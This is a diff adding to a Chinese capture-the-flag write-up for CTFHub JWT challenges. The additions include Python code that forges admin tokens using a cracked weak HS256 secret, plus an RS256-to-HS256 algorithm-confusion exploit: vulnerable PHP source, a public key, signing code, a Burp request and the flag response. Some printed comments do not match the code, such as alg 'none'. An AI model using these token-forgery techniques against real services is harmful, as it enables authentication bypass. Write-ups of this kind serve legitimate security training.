@@ -5058,11 +5058,51 @@ Secret is "gqqh"
 gqqh
 ```
 
-再用`JWT Encoder`，修改JWT中`role`字段为`admin`，生成新令牌后在`Burp Suite`中替换`token`发送请求，获取`flag`。或者用`HackBar`构造`GET`请求，点击`MODIFY HEADER`添加`Cookie`值，构造`GET`请求。
+再用`JWT Encoder`，修改JWT中`role`字段为`admin`，生成新令牌后可以直接用`Burp Suite`抓包并替换`token`发送请求，获取`flag`。
 
 ```
 token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.awzUfVEJ5H92HUaY9N424G_Z05U96ZYd5846MOS2sp0
 ```
+
+如果编写`Python`代码求解的话，可能会生成不一样的新令牌，这主要是由于Header字段的顺序不同。
+
+```python
+import jwt
+import json
+import base64
+
+def jwt_decode(token):
+    parts = token.split('.')
+    if len(parts) != 3:
+        raise ValueError("Invalid JWT")
+    # 补全base64 padding并进行base64解码
+    def _b64decode(s):
+        s += '=' * (-len(s) % 4)
+        return base64.b64decode(s)
+    # 用loads加载json数据
+    header = json.loads(_b64decode(parts[0]))
+    payload = json.loads(_b64decode(parts[1]))
+    signature = parts[2]  # 签名通常不 base64 解码（用于验证）
+    return header, payload, signature
+
+token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiZ3Vlc3QifQ.Sj5WN_tj2hIzQ_cqjL4prQCK7zfL8kHmUUyWt0-FMZg'
+(h, p, s) = jwt_decode(token)
+print("Header:", h)
+# Header: {'typ': 'JWT', 'alg': 'HS256'}
+print("Payload:", p)
+# Payload: {'username': 'admin', 'password': '123', 'role': 'guest'}
+secret = 'gqqh'  # c-jwt-cracker
+# JWT弱密码攻击 修改Payload
+p['role'] = 'admin'
+print("Modified Payload:", p)
+# Modified Payload: {'username': 'admin', 'password': '123', 'role': 'admin'}
+# 使用HS256算法生成新的JWT
+new_jwt = jwt.encode(p, secret, algorithm='HS256', headers=h)
+print("New JWT:", new_jwt)
+# None JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.WzlcMe5gGSwhVYk6DVp1ZXOE4r8WVmsCtBA8AJmj4RI
+```
+
+也可以用`HackBar`构造`GET`请求，点击`MODIFY HEADER`添加`Cookie`值，构造`GET`请求。
 
 靶机的回显信息如下：
 
@@ -5077,7 +5117,249 @@ token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvc
 
 > 有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。
 
+进入靶机后，发现这道题还在登录框下方给出了源码。
 
+```php+HTML
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <title>CTFHub JWTDemo</title>
+        <link rel="stylesheet" href="/static/style.css" />
+    </head>
+    <body>
+        <main id="content">
+            <header>Web Login</header>
+            <form id="login-form" method="POST">
+                <input type="text" name="username" placeholder="Username" />
+                <input type="password" name="password" placeholder="Password" />
+                <input type="submit" name="action" value="Login" />
+            </form>
+            <a href="/publickey.pem">publickey.pem</a>
+        </main>
+        <?php echo $_COOKIE['token'];?>
+        <hr/>
+    </body>
+</html>
+
+<?php
+require __DIR__ . '/vendor/autoload.php';
+use \Firebase\JWT\JWT;
+
+class JWTHelper {
+  public static function encode($payload=array(), $key='', $alg='HS256') {
+    return JWT::encode($payload, $key, $alg);
+  }
+  public static function decode($token, $key, $alg='HS256') {
+    try{
+            $header = JWTHelper::getHeader($token);
+            $algs = array_merge(array($header->alg, $alg));
+      return JWT::decode($token, $key, $algs);
+    } catch(Exception $e){
+      return false;
+    }
+    }
+    public static function getHeader($jwt) {
+        $tks = explode('.', $jwt);
+        list($headb64, $bodyb64, $cryptob64) = $tks;
+        $header = JWT::jsonDecode(JWT::urlsafeB64Decode($headb64));
+        return $header;
+    }
+}
+
+$FLAG = getenv("FLAG");
+$PRIVATE_KEY = file_get_contents("/privatekey.pem");
+$PUBLIC_KEY = file_get_contents("./publickey.pem");
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (!empty($_POST['username']) && !empty($_POST['password'])) {
+        $token = "";
+        if($_POST['username'] === 'admin' && $_POST['password'] === $FLAG){
+            $jwt_payload = array(
+                'username' => $_POST['username'],
+                'role'=> 'admin',
+            );
+            $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');
+        } else {
+            $jwt_payload = array(
+                'username' => $_POST['username'],
+                'role'=> 'guest',
+            );
+            $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');
+        }
+        @setcookie("token", $token, time()+1800);
+        header("Location: /index.php");
+        exit();
+    } else {
+        @setcookie("token", "");
+        header("Location: /index.php");
+        exit();
+    }
+} else {
+    if(!empty($_COOKIE['token']) && JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY) != false) {
+        $obj = JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY);
+        if ($obj->role === 'admin') {
+            echo $FLAG;
+        }
+    } else {
+        show_source(__FILE__);
+    }
+}
+?>
+```
+
+点击`/publickey.pem`，可以获取密钥。
+
+```
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuKKhfe7IongpIGLbDX3n
+wsnFvNRKmEpiD1x2j0hnF1FP5ufJe+qIL9HQQT73TqrvUz4ooxTXOwFgb/JGA9ZO
+dN9uKml7tzNC6Ezfy91A+QKXHsDLg5Mv5fF8cXA8mNuH1wG4WU/zONC0XIc6yw49
+7ZTHZmu6lPoyQbYs/bft3boeGXOg4GQ3AP9zYUUpUttt2pe9E00xkSGVMWQMgNV4
+v7rtiRYGJQ7VYICUM1iYaxqgZucRIlHFw/0wlxqjnGpJl3IrlNEoFUodQaBYiO6/
+AcyodITa89X6KWfK2/AUEfozHCkimVtj+o8PFNE3drS1yEBLxw3NjkA/Rl8mtQ+3
+fwIDAQAB
+-----END PUBLIC KEY-----
+```
+
+还是先输入`admin`和密码`123`，抓包获取`Cookie`中的`token`值。
+
+```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6Imd1ZXN0In0.sDLUMYjEARQ-zhlpOYvK9gOyxIP__hkgWUTN4Jdby8TfHWts8fPwsMWqDs6Tzxz3ixtzjE7lD5tr9yTfbF9Dx26mXFyHowDf-lpbb5cxpRXiVDrSRc2PZu_AHNt_hzscNRMiM4t8FMCLpyjSNjdriIB8GegJUVsuM_DH5ubroO7UUEPyP1LTnJRp5vBxQKTyuB_ODTy-sZWXDV-QkEE7JY7kXHL1-lKwgaiN_9MO-pjMVSrN5t41u_JetdfSMHCk2dUm2rkL_9nxcrFa5Ov4eBnHEx58dAZBY50U4lCxEYb4i0h7l55qsl__MzztPPPXHi1i3FivJiolPEM978TD4g
+```
+
+编写`Python`求解的代码如下：
+
+```python
+import json
+import hmac
+import base64
+import hashlib
+
+def jwt_decode(token):
+    parts = token.split('.')
+    if len(parts) != 3:
+        raise ValueError("Invalid JWT")
+    # 补全base64 padding并进行base64解码
+    def _b64decode(s):
+        s += '=' * (-len(s) % 4)
+        return base64.b64decode(s)
+    # 用loads加载json数据
+    header = json.loads(_b64decode(parts[0]))
+    payload = json.loads(_b64decode(parts[1]))
+    signature = parts[2]  # 签名通常不 base64 解码（用于验证）
+    return header, payload, signature
+
+token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6Imd1ZXN0In0.sDLUMYjEARQ-zhlpOYvK9gOyxIP__hkgWUTN4Jdby8TfHWts8fPwsMWqDs6Tzxz3ixtzjE7lD5tr9yTfbF9Dx26mXFyHowDf-lpbb5cxpRXiVDrSRc2PZu_AHNt_hzscNRMiM4t8FMCLpyjSNjdriIB8GegJUVsuM_DH5ubroO7UUEPyP1LTnJRp5vBxQKTyuB_ODTy-sZWXDV-QkEE7JY7kXHL1-lKwgaiN_9MO-pjMVSrN5t41u_JetdfSMHCk2dUm2rkL_9nxcrFa5Ov4eBnHEx58dAZBY50U4lCxEYb4i0h7l55qsl__MzztPPPXHi1i3FivJiolPEM978TD4g'
+(h, p, s) = jwt_decode(token)
+print("Header:", h)
+# Header: {'typ': 'JWT', 'alg': 'RS256'}
+print("Payload:", p)
+# Payload: {'username': 'admin', 'role': 'guest'}
+# JWT修改签名算法攻击 修改Header和Payload
+h['alg'] = 'HS256'
+print("Modified Header:", h)
+# Modified Header: {'typ': 'JWT', 'alg': 'none'}
+p['role'] = 'admin'
+print("Modified Payload:", p)
+# Modified Payload: {'username': 'admin', 'role': 'admin'}
+# 读取publickey.pem
+with open('publickey.pem') as f:
+    key = f.read()
+
+# 先转成JSON字符串再构造base64URL
+header = json.dumps(h, separators=(',', ':'))
+encodeHBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
+encodeHeader = str(encodeHBytes, "utf-8").rstrip("=")
+payload = json.dumps(p, separators=(',', ':'))
+encodePBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
+encodePayload = str(encodePBytes, "utf-8").rstrip("=")
+# 伪造签名
+token = (encodeHeader + "." + encodePayload)
+sig = base64.urlsafe_b64encode(hmac.new(bytes(key, "UTF-8"), token.encode("utf-8"), hashlib.sha256).digest()).decode("UTF-8").rstrip("=")
+new_jwt = (token + "." + sig)
+print(new_jwt)
+# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.WxKxR61Wm6EDqaTpqFKBQEe7mAyMp6YIxQpTScQer4c
+```
+
+用https://www.jwt.io/线上解密，先用`JWT Decoder`解密，输入密钥`publickey.pem`拿到`Json`数据。
+
+```
+{
+  "typ": "JWT",
+  "alg": "RS256"
+}
+
+{
+  "username": "admin",
+  "role": "guest"
+}
+```
+
+再用`JWT Encoder`，修改JWT中`role`字段为`admin`，得到新的`JWT`。
+
+```
+eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJyb2xlIjogImFkbWluIn0.h5dGmIE-g-tBd8lXx8s_VtWsyiuhdFhcZRqS1cgA4wc
+```
+
+用`Burp Suite`抓包，右键`Send to Repeater`，修改Cookie中的`token`值。
+
+```
+GET / HTTP/1.1
+Host: challenge-6c1d343bfdfa6adb.sandbox.ctfhub.com:10800
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: token=eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJyb2xlIjogImFkbWluIn0.h5dGmIE-g-tBd8lXx8s_VtWsyiuhdFhcZRqS1cgA4wc
+Connection: keep-alive
+```
+
+点击`Send`后可以在Response中看到`flag`。
+
+```html
+HTTP/1.1 200 OK
+Server: openresty/1.21.4.2
+Date: Sat, 17 Jan 2026 15:51:53 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 796
+Connection: keep-alive
+X-Powered-By: PHP/7.4.5
+Vary: Accept-Encoding
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Headers: X-Requested-With
+Access-Control-Allow-Methods: *
+
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+		<title>CTFHub JWTDemo</title>
+		<link rel="stylesheet" href="/static/style.css" />
+	</head>
+	<body>
+		<main id="content">
+			<header>Web Login</header>
+			<form id="login-form" method="POST">
+				<input type="text" name="username" placeholder="Username" />
+				<input type="password" name="password" placeholder="Password" />
+				<input type="submit" name="action" value="Login" />
+			</form>
+			<a href="/publickey.pem">publickey.pem</a>
+		</main>
+		eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJyb2xlIjogImFkbWluIn0.h5dGmIE-g-tBd8lXx8s_VtWsyiuhdFhcZRqS1cgA4wc		<hr/>
+	</body>
+</html>
+
+ctfhub{d55f930fbd37abf79855de29}
+```
+
+提交`ctfhub{d55f930fbd37abf79855de29}`即可。
 
 ------
 
